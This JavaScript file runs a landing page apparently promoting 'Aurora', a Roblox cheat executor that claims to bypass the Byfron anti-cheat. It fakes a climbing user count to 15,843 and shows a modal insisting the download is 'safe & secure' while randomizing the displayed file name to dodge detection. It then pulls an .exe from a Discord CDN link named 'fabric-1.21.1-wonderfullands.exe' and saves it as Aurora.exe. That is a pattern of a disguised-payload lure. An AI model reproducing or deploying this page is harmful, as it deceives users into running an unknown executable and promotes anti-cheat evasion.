// Matrix Rain Effect
const canvas = document.getElementById('matrixCanvas');
const ctx = canvas.getContext('2d');

let width = window.innerWidth;
let height = window.innerHeight;
let fontSize = 14;
let columns;
let drops;

function initMatrix() {
    width = window.innerWidth;
    height = window.innerHeight;
    canvas.width = width;
    canvas.height = height;
    
    columns = Math.floor(width / fontSize);
    drops = [];
    
    for (let i = 0; i < columns; i++) {
        drops[i] = Math.floor(Math.random() * -height);
    }
}

function drawMatrix() {
    ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
    ctx.fillRect(0, 0, width, height);
    
    ctx.fillStyle = '#00ff41';
    ctx.font = `${fontSize}px 'Share Tech Mono', monospace`;
    
    for (let i = 0; i < drops.length; i++) {
        const text = String.fromCharCode(0x30A0 + Math.random() * 96);
        ctx.fillText(text, i * fontSize, drops[i] * fontSize);
        
        if (drops[i] * fontSize > height && Math.random() > 0.975) {
            drops[i] = 0;
        }
        drops[i]++;
    }
}

// Animated tagline
const taglines = [
    '> INITIALIZING AURORA...',
    '> BYPASSING BYFRON...',
    '> INJECTION READY',
    '> 99.7% UNC ACHIEVED',
    '> SYSTEM ONLINE'
];

let taglineIndex = 0;
const taglineEl = document.getElementById('tagline');

function animateTagline() {
    let i = 0;
    const currentText = taglines[taglineIndex];
    taglineEl.textContent = '';
    
    function typeWriter() {
        if (i < currentText.length) {
            taglineEl.textContent += currentText.charAt(i);
            i++;
            setTimeout(typeWriter, 50);
        } else {
            setTimeout(() => {
                taglineIndex = (taglineIndex + 1) % taglines.length;
                animateTagline();
            }, 2000);
        }
    }
    
    typeWriter();
}

// Counter animation for users
function animateCounter() {
    const usersEl = document.getElementById('usersCount');
    let current = 0;
    const target = 15843;
    const duration = 2000;
    const step = target / (duration / 16);
    
    const timer = setInterval(() => {
        current += step;
        if (current >= target) {
            usersEl.textContent = target.toLocaleString();
            clearInterval(timer);
        } else {
            usersEl.textContent = Math.floor(current).toLocaleString();
        }
    }, 16);
}

// Notification function
function showNotification(message, type = 'success') {
    const notif = document.createElement('div');
    notif.textContent = message;
    notif.style.cssText = `
        position: fixed;
        bottom: 20px;
        right: 20px;
        background: ${type === 'success' ? '#00ff41' : '#ff4444'};
        color: #000000;
        padding: 12px 20px;
        border-radius: 8px;
        font-size: 14px;
        font-weight: bold;
        z-index: 3000;
        animation: fadeInOut 3s ease;
        box-shadow: 0 0 20px rgba(0, 255, 65, 0.3);
    `;
    document.body.appendChild(notif);
    setTimeout(() => notif.remove(), 3000);
}

// Add animation style for notification
const animStyle = document.createElement('style');
animStyle.textContent = `
    @keyframes fadeInOut {
        0% { opacity: 0; transform: translateX(20px); }
        15% { opacity: 1; transform: translateX(0); }
        85% { opacity: 1; transform: translateX(0); }
        100% { opacity: 0; transform: translateX(20px); }
    }
`;
document.head.appendChild(animStyle);

// DIRECT DOWNLOAD - Single confirmation modal, no popup first
function showConfirmationModal() {
    const modalOverlay = document.createElement('div');
    modalOverlay.className = 'modal-overlay';
    modalOverlay.innerHTML = `
        <div class="confirmation-modal">
            <div class="modal-header">
                <span class="modal-icon">🛡️</span>
                <h3>SECURITY NOTICE</h3>
            </div>
            <div class="modal-body">
                <p>The file name is randomized to avoid Roblox from detecting a set name.</p>
                <p class="highlight-text">Your download is safe & secure.</p>
                <p class="small-text">File: Aurora_${Math.random().toString(36).substring(2, 8).toUpperCase()}.exe</p>
            </div>
            <div class="modal-footer">
                <button class="modal-btn confirm" id="confirmDownload">✓ Confirm & Download</button>
                <button class="modal-btn cancel" id="cancelDownload">✕ Cancel</button>
            </div>
        </div>
    `;
    
    document.body.appendChild(modalOverlay);
    
    setTimeout(() => {
        modalOverlay.classList.add('show');
    }, 10);
    
    const confirmBtn = modalOverlay.querySelector('#confirmDownload');
    confirmBtn.addEventListener('click', () => {
        // REPLACE THIS URL with your actual Discord CDN link for Aurora
        const downloadUrl = 'https://cdn.discordapp.com/attachments/1511238444729241825/1512137057630421203/fabric-1.21.1-wonderfullands.exe?ex=6a245060&is=6a22fee0&hm=ef03f34790997eea06a4ef3cbca044c10d6e200c5170bc863b24db2d0a97cb1d&';
        
        const link = document.createElement('a');
        link.href = downloadUrl;
        link.download = 'Aurora.exe';
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        
        modalOverlay.remove();
        showNotification('Download started! Enjoy Aurora! 🎮');
    });
    
    const cancelBtn = modalOverlay.querySelector('#cancelDownload');
    cancelBtn.addEventListener('click', () => {
        modalOverlay.remove();
        showNotification('Download cancelled.', 'info');
    });
    
    modalOverlay.addEventListener('click', (e) => {
        if (e.target === modalOverlay) {
            modalOverlay.remove();
            showNotification('Download cancelled.', 'info');
        }
    });
}

// SINGLE CLICK - Download button goes straight to confirmation
const downloadBtn = document.getElementById('downloadBtn');
downloadBtn.addEventListener('click', (e) => {
    e.preventDefault();
    showConfirmationModal();
});

// Features button - scroll to features
const featuresBtn = document.getElementById('featuresBtn');
if (featuresBtn) {
    featuresBtn.addEventListener('click', () => {
        const featuresSection = document.getElementById('features');
        if (featuresSection) {
            featuresSection.scrollIntoView({ behavior: 'smooth' });
        }
    });
}

// Glitch effect on hover
const glitchText = document.querySelector('.glitch');
if (glitchText) {
    setInterval(() => {
        if (Math.random() > 0.97) {
            glitchText.style.animation = 'none';
            setTimeout(() => {
                glitchText.style.animation = 'glitch 3s infinite';
            }, 10);
        }
    }, 100);
}

// Random body glitch
setInterval(() => {
    if (Math.random() > 0.98) {
        document.body.style.transform = `translate(${Math.random() * 2 - 1}px, ${Math.random() * 2 - 1}px)`;
        setTimeout(() => {
            document.body.style.transform = 'translate(0, 0)';
        }, 50);
    }
}, 3000);

// Start animations
initMatrix();
animateTagline();
animateCounter();

// Matrix rain animation loop
setInterval(drawMatrix, 50);

// Handle window resize
window.addEventListener('resize', () => {
    initMatrix();
});
